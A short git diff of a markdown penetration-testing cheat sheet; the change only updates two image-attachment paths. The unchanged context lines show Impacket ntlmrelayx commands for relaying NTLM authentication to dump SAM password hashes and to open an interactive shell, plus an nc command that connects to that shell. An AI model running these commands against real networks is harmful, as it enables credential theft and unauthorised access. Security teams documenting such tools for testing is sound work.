@@ -34,7 +34,7 @@ tags:
  > **<font color=red>python3 /opt/impacket/examples/ntlmrelayx.py -tf </font>myTargets.txt <font color=red>-smb2support --no-multirelay</font>**<br>
  > Relay NTLM Hash and Dump Sam Hashes.
 
-![tool-ntlmrelayx-smb_relay_dump_sam.png.png](../../attachments/tool-ntlmrelayx-smb_relay_dump_sam.png.png)
+![tool-ntlmrelayx-smb_relay_dump_sam.png.png](../../_attachments/tool-ntlmrelayx-smb_relay_dump_sam.png.png)
 
 \** /!\ TO CHECK /!\ **
 
@@ -42,7 +42,7 @@ tags:
  > **<font color=red>python3 /opt/impacket/examples/ntlmrelayx.py -tf</font> myTargets.txt <font color=red>-smb2support --no-multirelay -i</font>**<br>
  > Relay NTLM Hash and start a Bind Shell.
 
-![tool-ntmlrelayx-smb_relay_reverse_shell.png](../../attachments/tool-ntmlrelayx-smb_relay_reverse_shell.png)
+![tool-ntmlrelayx-smb_relay_reverse_shell.png](../../_attachments/tool-ntmlrelayx-smb_relay_reverse_shell.png)
 
  > 
  > **<font color=red>nc 127.0.0.1 11000</font>**
